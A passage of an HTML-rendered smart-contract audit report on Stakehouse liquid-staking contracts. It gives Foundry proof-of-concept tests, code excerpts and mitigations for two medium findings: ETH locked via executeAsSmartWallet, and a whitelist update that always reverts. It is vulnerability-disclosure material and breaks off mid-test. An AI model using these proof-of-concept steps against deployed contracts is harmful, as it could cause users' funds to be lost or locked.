data-index=\"126\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testETHSentWhenCallingExecuteAsSmartWalletFunctionCanBeLost</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">updateDAOAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">admin</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nodeStakeAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accountOne</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nodeStakeAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">eoaRepresentative</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">accountTwo</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">registerBLSPublicKeys</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">nodeStakeAmount</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">getBytesArrayFromBytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">getBytesArrayFromBytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsPubKeyOne</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">eoaRepresentative</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Before the executeAsSmartWallet function is called, the manager contract owns 0 ETH,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//   and nodeRunner&#39;s smart wallet owns 4 ETH. </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">manager</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">smartWalletOfNodeRunner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1.5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">admin</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">admin</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// admin, who is dao at this moment, calls the executeAsSmartWallet function while sending 1.5 ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">executeAsSmartWallet</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Although admin attempts to send the 1.5 ETH through calling the executeAsSmartWallet function,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//   the sent 1.5 ETH was not transferred to nodeRunner&#39;s smart wallet but is locked in the manager contract instead.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">manager</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Because nodeRunner&#39;s smart wallet owns more than 1.5 ETH, 1.5 ETH of this smart wallet&#39;s ETH balance is actually sent to address(this).</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">smartWalletOfNodeRunner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeRunner</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"tools-used-24\" style=\"position:relative;\"><a href=\"#tools-used-24\" aria-label=\"tools used 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-42\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-42\" aria-label=\"recommended mitigation steps 42 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L210-L214\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L210-L214</a> can be updated to the following code.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"127\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IOwnableSmartWallet</span><span class=\"mtk1\">(</span><span class=\"mtk12\">smartWallet</span><span class=\"mtk1\">).</span><span class=\"mtk12\">execute</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_value</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/377\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/377#issuecomment-1332269918\">LSDan (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The external factor implied is that the DAO loses control of itself to bad actors. As such, this really can’t be a high risk.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-23-calling-updatenoderunnerwhiteliststatus-function-always-reverts\" style=\"position:relative;\"><a href=\"#m-23-calling-updatenoderunnerwhiteliststatus-function-always-reverts\" aria-label=\"m 23 calling updatenoderunnerwhiteliststatus function always reverts permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/378\">[M-23] Calling <code>updateNodeRunnerWhitelistStatus</code> function always reverts</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/378\">rbserver</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/443\">0xPanda</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/442\">ReyAdmirado</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/428\">Trust</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/398\">Josiah</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/396\">Franfran</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/344\">pashov</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/336\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/277\">btk</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/276\">zgo</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/259\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/217\">SmartSek</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/186\">Awesome</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/184\">shark</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/177\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/169\">trustindistrust</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/82\">HE1M</a>, and <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/67\">aphak5010</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L278-L284\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L278-L284</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L684-L692\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L684-L692</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492</a></p>\n<p>Calling the <code>updateNodeRunnerWhitelistStatus</code> function by the DAO supposes to allow the trusted node runners to use and interact with the protocol when <code>enableWhitelisting</code> is set to <code>true</code>. However, since calling the <code>updateNodeRunnerWhitelistStatus</code> function executes <code>require(isNodeRunnerWhitelisted[_nodeRunner] != isNodeRunnerWhitelisted[_nodeRunner], \"Unnecessary update to same status\")</code>, which always reverts, the DAO is unable to whitelist any trusted node runners. Because none of them can be whitelisted, all trusted node runners cannot call functions like <code>registerBLSPublicKeys</code> when the whitelisting mode is enabled. As the major functionalities become unavailable, the protocol’s usability becomes much limited, and the user experience becomes much degraded.</p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L278-L284\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L278-L284</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"128\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateNodeRunnerWhitelistStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_nodeRunner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">isWhitelisted</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyDAO</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_nodeRunner</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Zero address&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">isNodeRunnerWhitelisted</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nodeRunner</span><span class=\"mtk1\">] != </span><span class=\"mtk12\">isNodeRunnerWhitelisted</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nodeRunner</span><span class=\"mtk1\">], </span><span class=\"mtk8\">&quot;Unnecessary update to same status&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">isNodeRunnerWhitelisted</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nodeRunner</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">isWhitelisted</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NodeRunnerWhitelistingStatusChanged</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_nodeRunner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">isWhitelisted</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L684-L692\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L684-L692</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"129\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_isNodeRunnerValid</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_nodeRunner</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_nodeRunner</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Zero address&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">enableWhitelisting</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">isNodeRunnerWhitelisted</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_nodeRunner</span><span class=\"mtk1\">] == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Invalid node runner&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L426-L492</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"130\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">registerBLSPublicKeys</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blsPublicKeys</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blsSignatures</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_eoaRepresentative</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_isNodeRunnerValid</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">) == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Unrecognised node runner&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-38\" style=\"position:relative;\"><a href=\"#proof-of-concept-38\" aria-label=\"proof of concept 38 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Please add the following test in <code>test\\foundry\\LSDNFactory.t.sol</code>. This test will pass to demonstrate the described scenario.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"131\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testCallingUpdateNodeRunnerWhitelistStatusFunctionAlwaysReverts</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">updateDAOAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">admin</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">admin</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Unnecessary update to same status&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">updateNodeRunnerWhitelistStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">accountOne</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Unnecessary update to same status&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">manager</span><span 